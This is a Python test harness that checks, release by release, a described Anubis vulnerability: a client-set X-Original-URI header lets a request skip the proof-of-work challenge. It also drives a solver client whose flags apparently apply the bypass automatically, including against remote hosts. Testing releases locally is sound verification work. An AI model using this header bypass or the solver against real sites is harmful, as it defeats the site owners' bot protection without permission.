#!/usr/bin/env python3
"""
Verify CVE-2026-62314 locally: Anubis 1.22.0 .. <1.26.0-pre1 trusts the
client-controlled `X-Original-URI` header in lib/policy/checker.go
PathChecker.Check(), so a request for any protected path can be made to match
the default `(data)/common/keep-internet-working.yaml` ALLOW rules (for example
`^/\\.well-known/.*$`) and skip the proof-of-work challenge entirely.

For each tag it starts the locally built release in front of a backend and
compares two requests:

  control : GET /                      -> should get a challenge page
  exploit : GET / + X-Original-URI: /.well-known/x -> vulnerable releases
            proxy the request to the backend immediately

The backend body is the only success signal, so a pass means the challenge was
really bypassed, not merely re-rendered.

Usage:
    python3 test_cve_2026_62314.py
    python3 test_cve_2026_62314.py -t v1.24.0 -t v1.26.0-pre1
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import time
from http.server import ThreadingHTTPServer
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from test_versions import (
    MARKER,
    BackendHandler,
    available_flags,
    build_tag,
    free_port,
    prep_assets,
    prepare_worktree,
)

from anubis_solver import AnubisClient

ROOT = Path(__file__).resolve().parent.parent

# CVE range: >= 1.22.0, < 1.26.0-pre1. 1.21.x and earlier never read the
# header; 1.26.0-pre1 gates it behind subrequest mode.
DEFAULT_TAGS = [
    "v1.21.3",        # not affected (header support did not exist yet)
    "v1.22.0-pre1",   # not affected (code landed in pre2)
    "v1.22.0-pre2",   # first tag with the vulnerable code
    "v1.22.0",
    "v1.23.0-pre1",
    "v1.23.0",
    "v1.23.1",
    "v1.24.0-pre1",
    "v1.24.0",
    "v1.25.0",        # last vulnerable stable release
    "v1.26.0-pre1",   # fixed: X-Original-URI only honored in subrequest mode
    "v1.26.0",
    "v1.27.0",
    "v1.28.2",
]

POLICY = """\
bots:
  - import: (data)/common/keep-internet-working.yaml
  - name: all
    user_agent_regex: .
    action: CHALLENGE
    challenge:
      algorithm: fast
      difficulty: 4
"""

EXPLOIT_HEADER = {"X-Original-URI": "/.well-known/security.txt"}

BACKEND_PORT = 0


def start_anubis(tag: str, policy: Path) -> tuple[subprocess.Popen, int, Path, Path]:
    from test_versions import WORK

    path = WORK / tag
    binary = path / "anubis"
    flags = available_flags(path)
    port = free_port()
    metrics = free_port()
    log_path = path / "anubis-cve.log"
    cmd = [str(binary), "-bind", f"127.0.0.1:{port}"]
    if "metrics-bind" in flags:
        cmd += ["-metrics-bind", f"127.0.0.1:{metrics}"]
    if "target" in flags:
        cmd += ["-target", f"http://127.0.0.1:{BACKEND_PORT}"]
    if "policy-fname" in flags:
        cmd += ["-policy-fname", str(policy)]
    if "slog-level" in flags:
        cmd += ["-slog-level", "INFO"]
    if "difficulty" in flags:
        cmd += ["-difficulty", "4"]
    if "use-remote-address" in flags:
        cmd += ["-use-remote-address"]
    if "cookie-secure" in flags:
        cmd += ["-cookie-secure=false"]
    if "cookie-partitioned" in flags:
        cmd += ["-cookie-partitioned=false"]
    if "cookie-same-site" in flags:
        cmd += ["-cookie-same-site=Lax"]

    log = open(log_path, "wb")
    proc = subprocess.Popen(cmd, stdout=log, stderr=subprocess.STDOUT)
    return proc, port, log_path, path


def wait_ready(port: int, proc: subprocess.Popen) -> bool:
    base = f"http://127.0.0.1:{port}"
    for _ in range(250):
        if proc.poll() is not None:
            return False
        try:
            requests.get(base + "/", timeout=1)
            return True
        except requests.RequestException:
            time.sleep(0.1)
    return False


def is_challenge(text: str) -> bool:
    return 'id="anubis_challenge"' in text


def code_is_vulnerable(path: Path) -> bool:
    """Static check of the tag's PathChecker.Check()."""
    checker = path / "lib/policy/checker.go"
    if not checker.exists():
        return False
    text = checker.read_text(errors="replace")
    return "X-Original-URI" in text and "subRequestMode" not in text


def main(argv: list[str]) -> int:
    global BACKEND_PORT

    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--tag", action="append", default=None)
    parser.add_argument(
        "--results", default=str(ROOT / "results" / "cve-2026-62314.json")
    )
    args = parser.parse_args(argv)
    tags = args.tag or DEFAULT_TAGS

    backend = ThreadingHTTPServer(("127.0.0.1", free_port()), BackendHandler)
    backend.daemon_threads = True
    import threading

    threading.Thread(target=backend.serve_forever, daemon=True).start()
    BACKEND_PORT = backend.server_address[1]

    results = []
    try:
        for tag in tags:
            print(f"\n=== {tag} ===", flush=True)
            try:
                path = prepare_worktree(tag)
            except subprocess.CalledProcessError as exc:
                print(f"  worktree failed: {exc.stderr[-200:]}")
                results.append({"tag": tag, "status": "WORKTREE_FAIL"})
                continue

            prep_assets(path)
            binary, err = build_tag(path)
            if binary is None:
                print(f"  BUILD_FAIL: {err.strip().splitlines()[-1] if err.strip() else '?'}")
                results.append({"tag": tag, "status": "BUILD_FAIL", "detail": err[-500:]})
                continue

            policy = path / "policy-cve.yaml"
            policy.write_text(POLICY)
            proc, port, log_path, _ = start_anubis(tag, policy)
            base = f"http://127.0.0.1:{port}"
            headers = {"X-Real-IP": "127.0.0.1", "User-Agent": "cve-check/1.0"}
            try:
                if not wait_ready(port, proc):
                    print(f"  START_FAIL\n{log_path.read_text(errors='replace')[-600:]}")
                    results.append({"tag": tag, "status": "START_FAIL"})
                    continue

                # Control: no header -> must be challenged.
                t0 = time.time()
                ctrl = requests.get(base + "/", headers=headers, timeout=10)
                ctrl_ms = (time.time() - t0) * 1000
                control_challenged = is_challenge(ctrl.text)

                # Exploit: header matches the ALLOW rule, path is still "/".
                t0 = time.time()
                expl = requests.get(base + "/", headers={**headers, **EXPLOIT_HEADER}, timeout=10)
                expl_ms = (time.time() - t0) * 1000

                bypassed = MARKER in expl.text
                vulnerable_code = code_is_vulnerable(path)

                # Phase 2: the library's automatic fast path must pick the
                # bypass on vulnerable releases and fall back to PoW on fixed
                # ones.
                client = AnubisClient(
                    base, threads=4, timeout=15, use_cve=True, allow_remote_cve=True
                )
                t0 = time.time()
                c_resp = client.get("/")
                c_ms = (time.time() - t0) * 1000
                used_cve = client.cve_bypasses > 0 and not client.solutions
                solved = len(client.solutions) > 0
                if vulnerable_code:
                    client_ok = used_cve and MARKER in c_resp.text
                else:
                    client_ok = solved and client.cve_bypasses == 0 and MARKER in c_resp.text

                if not control_challenged:
                    verdict = "INCONCLUSIVE"
                elif not client_ok:
                    verdict = "MISMATCH"
                elif bypassed == vulnerable_code:
                    verdict = "VULNERABLE" if bypassed else "PROTECTED"
                else:
                    verdict = "MISMATCH"

                print(
                    f"  control: {'challenge' if control_challenged else 'no challenge'}"
                    f" ({ctrl_ms:.0f} ms)"
                )
                print(
                    f"  exploit: {'BYPASS -> backend' if bypassed else 'still challenged'}"
                    f" ({expl_ms:.0f} ms, status {expl.status_code})"
                )
                print(
                    f"  client : cve_bypasses={client.cve_bypasses} "
                    f"solutions={len(client.solutions)} ({c_ms:.0f} ms) "
                    f"-> {'OK' if client_ok else 'WRONG'}"
                )
                print(f"  verdict: {verdict}")

                results.append(
                    {
                        "tag": tag,
                        "status": verdict,
                        "control_challenged": control_challenged,
                        "bypassed": bypassed,
                        "control_ms": round(ctrl_ms, 1),
                        "exploit_ms": round(expl_ms, 1),
                        "exploit_status": expl.status_code,
                        "vulnerable_code": vulnerable_code,
                        "client_cve_bypasses": client.cve_bypasses,
                        "client_solutions": len(client.solutions),
                        "client_ms": round(c_ms, 1),
                        "client_ok": client_ok,
                    }
                )
            finally:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
            Path(args.results).write_text(json.dumps(results, indent=2) + "\n")
    finally:
        backend.shutdown()
        backend.server_close()

    print("\n=== summary ===")
    for r in results:
        print(f"  {r['tag']:<14} {r['status']:<11} {r.get('exploit_ms', '')} ms")
    bad = [r for r in results if r.get("status") not in ("VULNERABLE", "PROTECTED")]
    return 0 if not bad else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
